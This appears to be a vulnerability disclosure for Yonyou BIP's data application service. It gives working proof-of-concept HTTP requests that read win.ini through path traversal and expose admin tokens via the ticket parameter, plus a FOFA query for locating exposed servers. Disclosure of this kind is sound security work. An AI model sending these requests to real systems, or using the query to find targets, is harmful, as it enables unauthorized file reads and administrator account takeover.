# YonYouBip-path-travel
In the specific interface of UFIDA bip, there is processing ./Incorrect reference to read path when crossing path symbols leads to path traversal vulnerability.

## Affected Repository
- Project: YonYouBip
- Affect versions: YonYouBip-数据应用服务,v3
- File: /bi/api/Portal/LoginWithV8/?ticket=
- homePage: https://www.yonyou.com/
- Dependency: In the specific interfaces of UFIDA BIP, incorrect referencing as a read path when processing "../cross-path symbols" leads to a path traversal vulnerability

## Proof of Concept (PoC)
- path traversal.

```
GET /bi/api/Portal/LoginWithV8/?ticket=/../../../../Windows/win.ini HTTP/1.1
Host: 127.0.0.1:8008
Accept-Encoding: gzip
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
```

<img width="1767" height="337" alt="image" src="https://github.com/user-attachments/assets/12061675-ea60-43c9-958c-5ecbad27f1b0" />


- Data exposure
**Expose the available tokens for admin accounts in the system**
```
GET /bi/api/Portal/LoginWithV8/?ticket=admin HTTP/1.1
Host: 127.0.0.1:8008
Accept-Encoding: gzip
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36
```

<img width="1721" height="405" alt="image" src="https://github.com/user-attachments/assets/041a6b01-fe74-4a5d-a527-7bd148f8e920" />

## Vulnerability category
- CWE-22​ Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- CWE-200​ Exposure of Sensitive Information to an Unauthorized Actor

## Scope of influence
- fofa：body="YonBIP | 数据应用服务"
<img width="1184" height="557" alt="image" src="https://github.com/user-attachments/assets/24ddd5fd-2868-4db4-9f6a-4222ed0ace7e" />

